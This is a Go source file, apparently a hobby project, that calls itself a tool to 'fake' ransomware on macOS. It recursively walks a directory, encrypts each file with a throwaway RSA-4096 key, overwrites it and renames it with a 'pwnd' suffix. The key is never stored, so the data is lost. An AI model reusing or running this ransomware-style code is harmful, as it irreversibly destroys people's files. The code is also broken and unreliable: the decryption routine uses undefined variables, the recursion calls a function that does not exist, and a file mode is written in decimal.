package main

import (
	"encoding/base64"
	"crypto/sha256"
	"crypto/rand"
	"crypto/rsa"
	"fmt"
	"os"
)

func Banner() {
	// A banner for fun
	fmt.Println("	            .         .                                        ")
	fmt.Println("8 8888888888       ,8.       ,8.            d888888o.   8 8888      88 ")
	fmt.Println("8 8888            ,888.     ,888.         .`8888:' `88. 8 8888      88 ")
	fmt.Println("8 8888           .`8888.   .`8888.        8.`8888.   Y8 8 8888      88 ")
	fmt.Println("8 8888          ,8.`8888. ,8.`8888.       `8.`8888.     8 8888      88 ")
	fmt.Println("8 888888888888 ,8'8.`8888,8^8.`8888.       `8.`8888.    8 8888      88 ")
	fmt.Println("8 8888        ,8' `8.`8888' `8.`8888.       `8.`8888.   8 8888      88 ")
	fmt.Println("8 8888       ,8'   `8.`88'   `8.`8888.       `8.`8888.  8 8888      88 ")
	fmt.Println("8 8888      ,8'     `8.`'     `8.`8888.  8b   `8.`8888. ` 8888     ,8P ")
	fmt.Println("8 8888     ,8'       `8        `8.`8888. `8b.  ;8.`8888   8888   ,d8P  ")
	fmt.Println("8 8888    ,8'         `         `8.`8888. `Y8888P ,88P'    `Y88888P'   ")

	fmt.Println("\nFuck.My.Shit.Up. let you fake some ransomware activity on mac os, enjoy !")
	fmt.Println("Made By Denis <cr1ng3> REMACLE\n")
}

func KeyGen() (rsa.PublicKey, rsa.PrivateKey) {
	// key generation
	priv_key, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		fmt.Println("Could not generate Keys")
		os.Exit(1)
	}
	pub_key := priv_key.PublicKey
	return pub_key, *priv_key
}

func Encryption(to_Encrypt string, pub_key rsa.PublicKey) (string) {
	//Encrypt outgoing data
	data := []byte(to_Encrypt)
	rng := rand.Reader
	hash := sha256.New()
	msgLen := len(to_Encrypt)
    step := pub_key.Size() - 2*hash.Size() - 2
    var ciphertext []byte

    for start := 0; start < msgLen; start += step {
        finish := start + step
        if finish > msgLen {
            finish = msgLen
        }

        cipherblocks, err := rsa.EncryptOAEP(hash, rng, &pub_key, data[start:finish], nil)
        if err != nil {
            fmt.Printf("Error from encryption: %s\n", err)
			return "Encryption error"
        }

        ciphertext = append(ciphertext, cipherblocks...)
    }
	return string(ciphertext)
}

func Decryption(to_Decrypt string, server_priv_key rsa.PrivateKey) (string) {
	//Decrypt incoming data
	data := []byte(to_Decrypt)
	rng := rand.Reader
	hash := sha256.New()
	msgLen := len(to_Encrypt)
    step := pub_key.Size() - 2*hash.Size() - 2
    var plaintext []byte

    for start := 0; start < msgLen; start += step {
        finish := start + step
        if finish > msgLen {
            finish = msgLen
        }

		plainblocks, err := rsa.DecryptOAEP(hash, rng, &server_priv_key, data[start:finish], nil)
		if err != nil {
			fmt.Println("Decryption error : a user must've disconnected himself")
			return "Decryption error"
		}

        plaintext = append(plaintext, plainblocks...)
    }
	return string(plaintext)
}

func DirectoryNavigationEncryption(directory string, pub_key rsa.PublicKey, priv_key rsa.PrivateKey) {
	c, _ := os.ReadDir(directory)
	os.Chdir(directory)

    for _, entry := range c {
		if !(entry.IsDir()) {
			fmt.Print(entry.Name()+" isn't a directory... ")
			data, _ := os.ReadFile(entry.Name())
			encoded_data := base64.StdEncoding.EncodeToString([]byte(data))
			ciphertext := Encryption(encoded_data, pub_key)
			os.WriteFile(entry.Name(), []byte(ciphertext), 666)
			os.Rename(entry.Name(), entry.Name()+"pwnd")
			fmt.Print("PWNED\n")
		} else {
			DirectoryNavigation(entry.Name(), pub_key, priv_key)
			os.Chdir("..")
		}
    }

}

func main() {
	Banner()

	pub_key, priv_key := KeyGen()
	DirectoryNavigationEncryption("test", pub_key, priv_key)

}